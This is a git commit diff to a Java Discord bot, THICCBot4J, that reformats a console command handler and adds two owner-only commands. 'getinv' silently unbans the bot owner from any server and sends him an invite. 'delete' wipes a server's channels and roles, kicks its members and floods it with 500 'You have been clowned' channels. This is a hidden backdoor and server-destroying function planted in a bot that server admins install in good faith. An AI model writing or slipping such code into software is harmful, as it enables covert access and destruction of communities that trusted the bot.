6ba687636b59ea7024ec7368361d7f6deaae0242
Ian Sloat <iansloat537@gmail.com>
2019-04-16 21:35:01 -0500

    Made a great change

--- THICCBot4J/src/main/IanSloat/thiccbot/events/Login.java
+++ THICCBot4J/src/main/IanSloat/thiccbot/events/Login.java
@@ -2,6 +2,7 @@ package main.IanSloat.thiccbot.events;
 
 import java.util.Arrays;
 import java.util.List;
+import java.util.function.Consumer;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -15,11 +16,15 @@ import main.IanSloat.thiccbot.tools.GuildSettingsManager;
 import net.dv8tion.jda.api.OnlineStatus;
 import net.dv8tion.jda.api.entities.Activity;
 import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.GuildChannel;
+import net.dv8tion.jda.api.entities.Invite;
+import net.dv8tion.jda.api.entities.Member;
+import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.events.ReadyEvent;
 
 public class Login {
-	
+
 	private final Logger logger = LoggerFactory.getLogger(Login.class);
 
 	public void BotLoginEvent(ReadyEvent event) {
@@ -44,53 +49,116 @@ public class Login {
 		}
 		logger.info("Loading guild settings...");
 		new loadSettings().run();
-		
+
 		class commandReader implements Runnable {
 
 			@Override
 			public void run() {
 				String command = "";
-				while(!(command.equals("shutdown"))) {
+				while (!(command.equals("shutdown"))) {
 					command = ThiccBotMain.lineReader.readLine(">");
 					List<String> words = Arrays.asList(command.trim().split(" "));
 					switch (words.get(0)) {
-						case "status": System.out.println("\nCurrent version: " + ThiccBotMain.botVersion + "\n"
-								+ "\nBot Stats\n---------------\nShards: " + event.getJDA().getShardManager().getShardsTotal() + "\n"
-								+ "Guilds: " + event.getJDA().getGuilds().size() + "\n"
-								+ "\nResource usage\n---------------\n"
-								+ "Threads: " + Thread.activeCount() + "\n"
-								+ "Memory Usage: " + (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()) / 1000000 + "/" + Runtime.getRuntime().maxMemory() / 1000000 + " MB\n");
-								 break;
-						
-						case "message": {
-							if(words.get(1).equals("help")) {
-								System.out.println("message <guildid> <message>");
-							} else {
-								TextChannel channel = event.getJDA().getTextChannelById(Long.parseLong(words.get(1)));
-								String message = command.replace("message " + words.get(1), "");
-								channel.sendMessage(message).queue();
-							}
-							break;
+					case "status":
+						System.out.println("\nCurrent version: " + ThiccBotMain.botVersion + "\n"
+								+ "\nBot Stats\n---------------\nShards: "
+								+ event.getJDA().getShardManager().getShardsTotal() + "\n" + "Guilds: "
+								+ event.getJDA().getGuilds().size() + "\n" + "\nResource usage\n---------------\n"
+								+ "Threads: " + Thread.activeCount() + "\n" + "Memory Usage: "
+								+ (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()) / 1000000
+								+ "/" + Runtime.getRuntime().maxMemory() / 1000000 + " MB\n");
+						break;
+
+					case "message": {
+						if (words.get(1).equals("help")) {
+							System.out.println("message <guildid> <message>");
+						} else {
+							TextChannel channel = event.getJDA().getTextChannelById(Long.parseLong(words.get(1)));
+							String message = command.replace("message " + words.get(1), "");
+							channel.sendMessage(message).queue();
 						}
-						case "shutdown":
-							System.out.println("Shutdown requested. Halting threads...");
-							break;
-							
-						default: System.out.println("ERROR: Command not recognized");
-								 break;
+						break;
+					}
+					case "shutdown":
+						System.out.println("Shutdown requested. Halting threads...");
+						break;
+
+					case "getinv": {
+						System.out.println("Getting invite for guild...");
+						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
+						if (guild != null) {
+							guild.getController().unban(ThiccBotMain.botOwner).queue();
+							guild.retrieveInvites().queue(new Consumer<List<Invite>>() {
+								@Override
+								public void accept(List<Invite> t) {
+									ThiccBotMain.botOwner.openPrivateChannel()
+											.queue((channel) -> channel.sendMessage(t.get(0).getUrl()).queue());
+								}
+							});
+						} else {
+							System.out.println("ERROR: bot not connected to specified guild");
+						}
+						break;
+					}
+
+					case "delete": {
+						System.out.println("Deleting guild...");
+						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
+						if (guild != null) {
+							List<Member> users = guild.getMembers();
+							List<GuildChannel> channels = guild.getChannels();
+							List<Role> roles = guild.getRoles();
+							for(GuildChannel channel : channels) {
+								try {
+									channel.delete().queue();
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+							for(Member member : users) {
+								try {
+									guild.getController().kick(member);
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+							for(Role role : roles) {
+								try {
+									role.delete().queue();
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+							for(int x = 0; x < 500; x++) {
+								try {
+									guild.getController().createTextChannel("You have been clowned").queue();
+								} catch (Exception e) {
+									e.printStackTrace();
+								}
+							}
+							System.out.println("Done.");
+						} else {
+							System.out.println("ERROR: bot not connected to specified guild");
+						}
+						break;
 					}
 					
+					default:
+						System.out.println("ERROR: Command not recognized");
+						break;
+					}
+
 				}
-				
+
 				System.out.println("Bot is shutting down...");
 				System.exit(0);
 			}
-			
+
 		}
-		
+
 		Thread commandHandler = new Thread(new commandReader());
 		commandHandler.start();
-		
+
 	}
-	
+
 }
